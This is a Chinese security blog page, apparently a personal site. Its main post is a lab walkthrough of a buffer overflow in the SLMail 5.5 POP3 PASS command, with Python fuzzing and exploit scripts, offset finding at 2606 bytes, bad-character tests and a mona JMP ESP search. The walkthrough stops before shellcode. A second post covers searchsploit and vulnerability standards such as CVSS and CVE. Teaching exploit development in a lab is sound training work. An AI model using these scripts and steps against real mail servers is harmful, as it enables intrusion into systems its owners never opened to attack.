            <h3 id="0x00-缓冲区"><a href="#0x00-缓冲区" class="headerlink" title="0x00 缓冲区"></a>0x00 缓冲区</h3><p>缓冲区其实是内存中的一个片段，用于存放内存中的数据。我们知道程序是动态的，会根据不同的输入，参数等等而产生不同的计算结果，因为计算机程序的应用，使得整个人类的计算能力得到了上帝的技能，但是这也成为了程序的致命弱点，它无法判断哪些输入是有有害的，哪些输入会导致内存溢出或者计算机崩溃。</p>
<p>程序漏洞其本质上是数据与代码边界的混淆不清，从而让程序执行了一些不可预测的指令。</p>
<hr>
<h4 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h4><p>当缓冲区边界限制不严格时,由于变量传入畸形数据或程序运行错误,导致缓冲区被“撑<br>暴”,从而覆盖了相邻内存区域的数据;</p>
<p>成功修改内存数据,可造成进程劫持,执行恶意代码,获取服务器控制权等后果.</p>
<hr>
<h4 id="如何发现漏洞"><a href="#如何发现漏洞" class="headerlink" title="如何发现漏洞?"></a>如何发现漏洞?</h4><p>目前比较主流的发现漏洞的方法有三种方式 :<strong>源码审计</strong> ，<strong>逆向工程</strong>，<strong>模糊测试</strong>。</p>
<hr>
<h3 id="0x01-Windows-缓冲区溢出"><a href="#0x01-Windows-缓冲区溢出" class="headerlink" title="0x01 Windows 缓冲区溢出"></a>0x01 Windows 缓冲区溢出</h3><p>目标环境:SLMail 5.50Mail Server(OS XP;ip:192.168.1.12)<br>动态调试工具:ImmunityDebugger<br>测试脚本:mona.py<br>操作环境:OS:Kali;ip:192.168.1.11<br>ImmunityDebugger 可以调用 py脚本，并且其自动化程序更高。</p>
<p>当 SLMail 邮件服务安装完成以后 <code>netstat -nao</code> 查看端口检测是否安装成功.可以发现，25,110,180等端口都已经开放。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-a6dc28c7dc5d1066.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="SLMail"></p>
<p>Ok,服务器软件安装成功以后便可以安装 Debugger 工具了。</p>
<p>对于 mona.py 脚本程序我们可以在 Github 中获得。</p>
<p>一切安装完成以后，将 <code>mona.py</code> 脚本导入到 <code>Immunity Debugger\PyCommands</code> 目录就好了。</p>
<p>本次实验并不适合在 XP 以上的 window中环境中测试，因为 SLMail 是个很早的软件了，此外从 win7 开始微软便加入了系统级别的 DEP 和 ASLR 防护。</p>
<p>DEP: 结合 CPU 特性，通过软硬件的协同，阻止代码从数据页被执行。这样即使代码存在漏洞，也不会那么容易被直接利用。奈何，黑客的存在就是为了打破规则的，现在 DEP 也被绕的出不多算是个摆设了。所以，微软接着又提出来 ASLR 返回机制。</p>
<p>ASLR: 很久以前，代码在 os  内存中执行的地址是固定，我们甚至可以直接将某个 shell 打到一个指定的内存地址中去执行代码。这种基于静态的内存分配机制很容易被利用。所以，基于动态的，随机内存地址加载执行程序和 DLL内存分配机制便被广泛应用起来。</p>
<hr>
<h3 id="0x02-POP3"><a href="#0x02-POP3" class="headerlink" title="0x02 POP3"></a>0x02 POP3</h3><p>网络协议何止一种，当我遇到不熟悉的网络协议的时候，可以使用 wireshark 去抓包，去分析，了解这个我们原本不熟悉的协议。当然我们现在已经知道 SLMali 中 POP3 协议 的 <code>PASS</code> 命令是存在的，并且存在缓存区溢出的。</p>
<p>使用 <code>pass</code> 对 XP SLMail 100 端口发送数据。但是要发生缓冲区溢出，意味着我们需要对其发送大量的数据，而为了搞清楚到底多大的数据请求会导致其缓冲区溢出，我们需要不断的迭代累加的去发起请求，以次获得最接近的那个临界值，那么，现在从一个简单的 02.py 脚本开始</p>
<h5 id="02-py"><a href="#02-py" class="headerlink" title="02.py"></a>02.py</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">buffer = [&quot;A&quot;]</span><br><span class="line">counter = 100</span><br><span class="line">while len(buffer) &lt;= 50:</span><br><span class="line">	buffer.append(&quot;A&quot; *counter)</span><br><span class="line">	counter = counter + 200</span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">	print &quot;Fuzzing PASS with %s bytes&quot; % len(string)</span><br><span class="line">	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	connect = s.connect((&apos;192.168.1.12&apos;, 110))</span><br><span class="line">	s.recv(1024)</span><br><span class="line">	s.send(&apos;USER test&apos;+ &apos;\r\n&apos;)</span><br><span class="line">	s.recv(1024)</span><br><span class="line">	s.send(&apos;PASS &apos; + string + &apos;\r\n&apos;)</span><br><span class="line">	s.send(&apos;QUIT\r\n&apos;)</span><br><span class="line">	s.close()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>当然，如果我们已经发送了大量的弹出数据但是依旧没有发生溢出，这时我们可以放弃对这个参数的模糊测试了。</p>
</blockquote>
<hr>
<h4 id="Debugger"><a href="#Debugger" class="headerlink" title="Debugger"></a>Debugger</h4><p>数据一旦发送，便可以打开 XP 中的 Debugger 工具观察服务器状态。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-f9f0948ccd1118ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Dubugger"></p>
<p>我们可在 <code>file&gt;open</code> 直接打开一个 <code>.exe</code> 文件进行静态调试，也可以 <code>file&gt;Attach</code> 选择一个正在运行的程序进行动态调试。</p>
<h5 id="Attach"><a href="#Attach" class="headerlink" title="Attach"></a>Attach</h5><p><img src="http://upload-images.jianshu.io/upload_images/1571420-22627775f9d12909.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Attach"></p>
<p>我们选择 <code>Attach</code> 并对 <code>SLMail</code> 这个程序进行 Attach。但一个正在运行的程序被 <code>Attach</code> 后便会暂停运行，为了观察我们需要让其继续运行起来。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-f22ee3dfd71f9015.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="run again"></p>
<h5 id="正式发起数据请求"><a href="#正式发起数据请求" class="headerlink" title="正式发起数据请求"></a>正式发起数据请求</h5><p>现在我们通过 Kali 运行 02.py 脚本对其发送大量数据</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-b22e7bf55799bb22.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Paste_Image.png"></p>
<p>在右侧的 <code>Register</code> 中，<code>EIP</code> 寄存器中所存放的的下一条指令的地址。通过 <code>EIP</code> 寄存器我们做蛮多有意思的事情，就是当发现缓存区溢出以后如去利用。</p>
<p>运行 <code>02.py</code> 脚本程序，我们每次递增 100 个字节向目标服务器发起请求数据，可以看到当发送的字节数达到 3000 bytes 时，程序崩溃了，说明 <code>PASS</code> 指令确实存在缓冲区溢出，而为了得到更加精确的崩溃临界点，我们有了 <code>03.py</code> 脚本程序。</p>
<h5 id="03-py"><a href="#03-py" class="headerlink" title="03.py"></a>03.py</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">buffer = &quot;A&quot; * 2700</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect(&apos;192.168.1.12&quot;, 110)</span><br><span class="line">    data = s.recv(1024)</span><br><span class="line">    s.send(&apos;USER admin&apos; + &apos;\r\n&apos;)</span><br><span class="line">    data = s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!.&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3&quot;</span><br></pre></td></tr></table></figure>
<p>通过，<code>03.py</code> 脚本首先发送了 2700 个 “A”,发现程序也崩溃了，于是尝试减少发送的数据量为 2600 个 “A”，发现程序还是崩溃了，但是与 2700 个字符串导致的崩溃不同，2600 个 “A” 并没有完全覆盖 EIP 寄存器，这意味着我们得到了一个区间，在 2700~2600之间，我们离潘多拉的魔盒又近了一步，现在，我们有两种方式去尝试打开盒子，一个是二分法，不断的细分这个区间的值，虽然这种方式有点笨，但是终归是可以找到真理的。或者，可以试试唯一字符串的方式。</p>
<p>Python 中自带了一个能生成唯一字符串的脚本程序 <code>pattern_create.rb</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./usr/shaer/metasploit-framework/tools/exploit/pattern_create.rb 2700</span><br><span class="line">// 生成2700个唯一字符串 &#123;str&#125;</span><br></pre></td></tr></table></figure>
<p>我们将 {str} 字符串替换掉 <code>03.py</code> 中的 “A”，得到 <code>04.py</code>：</p>
<h5 id="04-py"><a href="#04-py" class="headerlink" title="04.py"></a>04.py</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">buffer = &quot;str&quot;</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect(&apos;192.168.1.12&quot;, 110)</span><br><span class="line">    data = s.recv(1024)</span><br><span class="line">    s.send(&apos;USER admin&apos; + &apos;\r\n&apos;)</span><br><span class="line">    data = s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!.&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3&quot;</span><br></pre></td></tr></table></figure>
<p>再次发送数据，程序崩溃，得到 EIP 寄存器中的数值 <code>39 69 44 38</code><br>计算机和人不一样，它在寄存器中所存储的数据的顺序是从高位向地位的，所以转换为人类的可读顺序就是 <code>38 44 69 39</code>，然后t通过对照 ASCII 码表，我们可以得到其确切的信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">十六进制:38 44 69 39</span><br><span class="line">ASCII:8 D i 9</span><br></pre></td></tr></table></figure>
<p>进一步执行 <code>exploit</code> 目录下的 <code>pattern_offset.rb</code> 文件便可以得到 <code>39 69 44 38</code> 在唯一字符串中的精准偏移量:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb 39694438</span><br><span class="line">[*] Exact match at offset 2606</span><br></pre></td></tr></table></figure>
<p>我们得到了溢出的位置，即是程序是从 2606 这个位置开始崩溃的，但是为了再次验证这个结果可靠性，我们再次对 <code>03.py</code> 脚本进行修改，让其先发送 2606 个 <code>A</code> ，再发送四个 <code>B</code>，接着发送20个 <code>C</code>，然后去观察 <code>Dubugger</code> 调试工具中的 <code>EIP</code> 寄存器是否会被写入4个 <code>B</code>?</p>
<h5 id="05-py"><a href="#05-py" class="headerlink" title="05.py"></a>05.py</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">buffer = &quot;A&quot;*2606 + &quot;B&quot;*4 + &quot;C&quot;*20</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect(&apos;192.168.1.12&quot;, 110)</span><br><span class="line">    data = s.recv(1024)</span><br><span class="line">    s.send(&apos;USER admin&apos; + &apos;\r\n&apos;)</span><br><span class="line">    data = s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!.&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3&quot;</span><br></pre></td></tr></table></figure>
<p>我们发现，得到结果和我们预想的一样，程序崩溃后，<code>EIP</code> 被填满了 <code>424242</code> [ B 对应的 ASCII 码是 42]，同时 <code>ESP</code> 被填满了20个 <code>C</code>,如此，我们知道了，程序确是 2606 这个位置发生了溢出，而当溢出后我们便可以从这位置开始写入任意 <code>指令</code> 了。</p>
<blockquote>
<p>潘多拉的魔盒已开，我要进去看看另一个世界的样子</p>
</blockquote>
<hr>
<h3 id="0x03-模糊测试-Fuzzing"><a href="#0x03-模糊测试-Fuzzing" class="headerlink" title="0x03 模糊测试(Fuzzing)"></a>0x03 模糊测试(Fuzzing)</h3><hr>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>我们已经得到了 <code>EIP</code> 的溢出地址，而下一步我们需要将 <code>EIP</code> 修改为 shellcode 代码的内存地址，从而将 shellcode 写入到该地址空间，当程序读取 <code>EIP</code> 寄存器数值时，将跳转到 shellcode 代码段并执行。</p>
<hr>
<h4 id="寻找可存放-shellcode-的内存空间"><a href="#寻找可存放-shellcode-的内存空间" class="headerlink" title="寻找可存放 shellcode 的内存空间"></a>寻找可存放 shellcode 的内存空间</h4><p>通过之前的操作，我们发现原来 <code>ESP</code> 寄存器也是可以被修改的，那么，现在尝试将 <code>ESP</code> 作为 shellcode 的存放空间。</p>
<p>首先，假设目标的内存中可以存放的字符总数是 3500 个，去掉 <code>EIP</code> 寄存器中的 2606+4 个，理论上，<code>ESP</code> 中将会存放 <code>3500-2606+4</code> 个字符,由此，便可以判断 <code>ESP</code> 的容量大小是否可以作为 shellcode 的存放空间。</p>
<p>可在 <code>03.py</code> 脚本的基础上得到 <code>05.py</code>(其实，除了 buffer 不一样， 03.py, 04.py, 05.py, 06.py都是同一个脚本程序)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">buffer = &quot;A&quot;*2606 + &quot;B&quot;*4 + &quot;C&quot;*(3500 - 2606 -4)</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect(&apos;192.168.1.12&quot;, 110)</span><br><span class="line">    data = s.recv(1024)</span><br><span class="line">    s.send(&apos;USER admin&apos; + &apos;\r\n&apos;)</span><br><span class="line">    data = s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!.&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3&quot;</span><br></pre></td></tr></table></figure>
<p>同样，我们再次重启 SLMail 服务，并打开 Debugger 调试工具，运行脚本程序。打开 Debugger <code>EIP</code> 的内存地址被精准的修改为 <code>42424242</code>，而 <code>ESP</code> 被填满了很多的 “C”，对 <code>ESP</code> 右键选择 <code>Follow In Dump</code> ，通过界面中的 <code>Address</code> 栏， 同时为了观察的方便，将<code>Hex</code>调整为 <code>16bytes</code> 。</p>
<p>发现最开始出现 “C” 的地址为 <code>EF7A154</code> ，而 “C” 的结束位置是<code>EF7A2F4</code>，通过计算得到其差值为 <code>1A0</code>，装换为十进制为 <code>416</code>。 即是 <code>ESP</code> 寄存器可以存放 <code>416 bytes</code> 的数据，可以满足一条 shellcode 所需的存放空间。</p>
<p>似乎，只需将 shellcode 放进去就好了。。。是，想象是美好的，二进制的世界是残酷的，我们遇到的第一个问题就是 <strong>坏字符</strong>。</p>
<hr>
<h4 id="坏字符"><a href="#坏字符" class="headerlink" title="坏字符"></a>坏字符</h4><p>不同类型的程序，协议，漏洞，会将某些字符认为是坏字符，一旦在内存中出现这些字符，将会导致程序的崩溃或者锁死，或者本过滤，因为这些字符通常有固定的用途。</p>
<p>比如 <code>0x00 空子符</code>,<code>0x0D 回车</code>，但这只是基于我们已知的认知，是否其 <code>ESP</code> 中还存在其他坏字符呢？而如果要对 <code>ESP</code> 注入 shellcode ，又需要先将 <code>ESP</code> 中的坏字符全部挑选出来。</p>
<p>此时，我们需要用到脚本 <code>07.py</code> </p>
<h5 id="07-py"><a href="#07-py" class="headerlink" title="07.py"></a>07.py</h5><p>基本原理:在 ASCII 中一个字符表示一个字节，而一个字节代表一个 8位的二进制数，从[00000000 ~ 11111111] 一共可以表示 256 个可能的字符。</p>
<p>那么，可以发送 0x00 ~ 0xff 共 256 个字符进行测试，以此找出所有的坏字符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">badChars = &#123;&quot;---&quot;</span><br><span class="line">&quot;---&quot;</span><br><span class="line">&quot;---&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">buffer = &quot;A&quot;*2606 + &quot;B&quot;*4 + badChars</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect(&apos;192.168.1.12&quot;, 110)</span><br><span class="line">    data = s.recv(1024)</span><br><span class="line">    s.send(&apos;USER admin&apos; + &apos;\r\n&apos;)</span><br><span class="line">    data = s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!.&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3&quot;</span><br></pre></td></tr></table></figure>
<p>通过对 Dubugger 的观察(即是当程序崩溃是，Address 中出现不连续的字符序列，即可找出坏字符)，我们一共找出了三个坏字符<code>0x00</code>,  <code>0x0A</code>, <code>0x0D</code>。</p>
<hr>
<h3 id="0x04-数据重定向"><a href="#0x04-数据重定向" class="headerlink" title="0x04 数据重定向"></a>0x04 数据重定向</h3><p>我们已经找到了所有的坏字符，现在可以开始进行数据重定向了，即只要将 ESP 的地址替换为 EIP 的值就可以了。但是问题有又来了，计算机 ESP 寄存器的地址是随机变化的，每次开关机，每次运行 SLMail 程序都会随机变化。</p>
<p>面对这个问题，我们的思路如下:</p>
<ul>
<li>首先在内存中寻找内存地址固定的系统模块。</li>
<li>其次在模块中寻找 <code>JMP ESP</code> 指令的地址，再由该指令间接跳转到 <code>ESP</code>，从而执行 <code>shellcode</code>。</li>
<li>然后使用 <code>mona.py</code> 脚本识别内存模块，搜索 <code>return address</code> 是 <code>JMP ESP</code> 的指令模块。</li>
<li>再寻找无 DEP,ALSR 保护的内存地址。</li>
<li>最后，确保内存地址中不包含坏字符。</li>
</ul>
<p>这也是进行缓冲区溢出遇到目标地址随机变化时常用的思路，找到一个内存地址固定不变的系统模块中 <code>JMP ESP</code> 指令所在的地址，通过该地址跳转到 ESP，以不变应万变。</p>
<hr>
<h4 id="如何找"><a href="#如何找" class="headerlink" title="如何找?"></a>如何找?</h4><p><code>mona.py</code> 自带的脚本程序可以很好的帮助我们去发现系统中的 <code>JMP ESP</code> 地址。</p>
<p>在 <code>Immunity Debugger</code> 中输入 <code>!mona modules</code> ,可以得到 SMLMail 程序运行时所调用的系统模块。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-95aefa4e048a68ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="!mona modules"></p>
<p>找到 <code>Rebase</code> ，<code>SafeSEH</code>, <code>ASLR</code>,<code>NXCompat</code> 为 <code>False</code> ，而 <code>OS DLL</code> 为 <code>True</code> 的系统模块。(假如该模块的名称是 <code>USER32.dll</code>)</p>
<hr>
<h4 id="nasm-shell-rb"><a href="#nasm-shell-rb" class="headerlink" title="nasm_shell.rb"></a>nasm_shell.rb</h4><p>Kali 中的 <code>nasm_shell.rb</code> 脚本可以将汇编语言转换为二进制。<br>运行该脚本,将指令 <code>jmp esp</code> 转换为二进制:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit# ./nasm_shell.rb </span><br><span class="line">nasm &gt; jmp esp</span><br><span class="line">00000000  FFE4       jmp esp</span><br></pre></td></tr></table></figure>
<p>如上，我们得到了 <code>jmp esp</code> 指令的二进制表示为 <code>FFE4</code>,回到 <code>Debugger</code> 调试工具,使用 <code>!mona find -s &quot;\xff\xe4 -m UERSER32.dll&quot;</code>，去查找 <code>openc32.dll</code> 中是否存在 <code>jmp esp</code> 指令。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-ac1005f109595fdb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="jmp esp"></p>
<p>未完待续。。。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/06/15/漏洞扫描基本概念/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="onejustonee">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="onejustone">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/06/15/漏洞扫描基本概念/" itemprop="url">漏洞扫描基本概念</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-15T10:30:00+08:00">
                2016-06-15
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/technology/" itemprop="url" rel="index">
                    <span itemprop="name">technology</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>通过之前的扫描我们可以知道目标主机的一些基本信息，然后我们可以基于这些个基本信息去进一步的发现目标是否存在漏洞，当然这种方式虽然可行，但是效率太低。</p>
<p>对于这方面，kali的提供了一个漏洞集成网站:<a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a></p>
<hr>
<h4 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h4><p>同时kali系统也集成了searchsploit命令，该命令可以查询到eploit-db网站中所有的漏洞信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ searchsploit tomcat</span><br><span class="line">--------------------------------------------- ----------------------------------</span><br><span class="line"> Exploit Title                               |  Path</span><br><span class="line">                                             | (/usr/share/exploitdb/platforms)</span><br><span class="line">--------------------------------------------- ----------------------------------</span><br><span class="line">Apache Tomcat &lt; 5.5.17 - Remote Directory Li | ./multiple/remote/2061.txt</span><br></pre></td></tr></table></figure>
<p>由此也可以知道searchsploit的文档库的位置为:<strong>/usr/share/exploit/platforms</strong>中</p>
<p>然后我们只需要对其中的脚本只进行简单的修改就可以加以利用了。</p>
<hr>
<h4 id="Sandi"><a href="#Sandi" class="headerlink" title="Sandi"></a>Sandi</h4><p>Sandi将会以图形化的界面对exploit-db库中结果进行显示。</p>
<hr>
<h3 id="0x01-漏洞基本概念"><a href="#0x01-漏洞基本概念" class="headerlink" title="0x01 漏洞基本概念"></a>0x01 漏洞基本概念</h3><hr>
<h4 id="CVSS-Common-Vulnerability-Scoring-System"><a href="#CVSS-Common-Vulnerability-Scoring-System" class="headerlink" title="CVSS(Common Vulnerability Scoring System)"></a>CVSS(Common Vulnerability Scoring System)</h4><p>CVSS是通用的漏洞评分系统，它是工业标准，用于描述安全漏洞严重程度的统一评分方案。</p>
<p>CVSS使用Metric对弱电进行了分类:</p>
<ul>
<li>Basic Metric 基础的恒定不变的弱点权重</li>
<li>Temporal Metric 依赖时间因素的弱点权重</li>
<li>Enviromental Metric 利用弱点的环境要求和实施难度的权重</li>
</ul>
<p>CVSS是安全内容自动化协议(SCAP)的一部分。通常CVSS与CVE一同由美国国家漏洞库(NVD)发布并保持数据的更新。</p>
<p>CVSS的评分范围是：0-10。10是最高等级，不同机构按CVSS分值定义威胁的中，高，低<strong>威胁级别</strong>，CVSS是工业标准，但是威胁等级级别不是。</p>
<hr>
<h3 id="CVE-Common-Vulnerabilities-and-Exposures"><a href="#CVE-Common-Vulnerabilities-and-Exposures" class="headerlink" title="CVE(Common Vulnerabilities and Exposures)"></a>CVE(Common Vulnerabilities and Exposures)</h3><p>CVE是已公开的信息安全漏洞字典，同时也是统一的漏洞编号标准。<br>因为CVE的存在，使得漏洞的世界秩序变得清晰可辨。</p>
<p>当发现一个漏洞后，CAN负责指定CVE ID，然后发布到CVE LIst中:CVE-2008-4250，然后MITRE公司负责对内容进行编辑维护。</p>
<p>同时有的厂商也会有自己的CVE标准，比如微软的MS漏洞编号，MSKB为补丁编号。不同组织不同机构也许会有不同的CVE标准。</p>
<hr>
<h4 id="OVAL-Open-Vulnerability-and-Assessment-Language"><a href="#OVAL-Open-Vulnerability-and-Assessment-Language" class="headerlink" title="OVAL(Open Vulnerability and Assessment Language)"></a>OVAL(Open Vulnerability and Assessment Language)</h4><p>描述漏洞检测方法的机器可识别语言。会以xml的格式进行发布。它是一个技术性的描述。它详细的描述了漏洞检测的技术细节，可导入自动化检测工具中实施漏洞检测工作。</p>
<hr>
<h4 id="CEE"><a href="#CEE" class="headerlink" title="CEE"></a>CEE</h4><p>描述软件配置缺陷的一种标准格式。<br>在信息安全风险评估中，配置缺陷的检测是一项重要内容，使用CCE可以让配置缺陷以标准的方式展现出来，便于配置缺陷评估的可量化操作。</p>
<hr>
<h4 id="CPE-Common-Product-Enumeration"><a href="#CPE-Common-Product-Enumeration" class="headerlink" title="CPE(Common Product Enumeration)"></a>CPE(Common Product Enumeration)</h4><p>信息技术产品，系统，软件包的结构化命名规范，分类命名标准。</p>
<hr>
<h4 id="CWE-Common-Weakness-Enumeration"><a href="#CWE-Common-Weakness-Enumeration" class="headerlink" title="CWE(Common Weakness Enumeration)"></a>CWE(Common Weakness Enumeration)</h4><p>常见漏洞类型的字典，描述不同类型漏洞的特征，不同于OVAL，CWE只是一个大体上的分类而已，不会去具体的打分（访问控制，信息泄露，拒绝服务）。</p>
<hr>
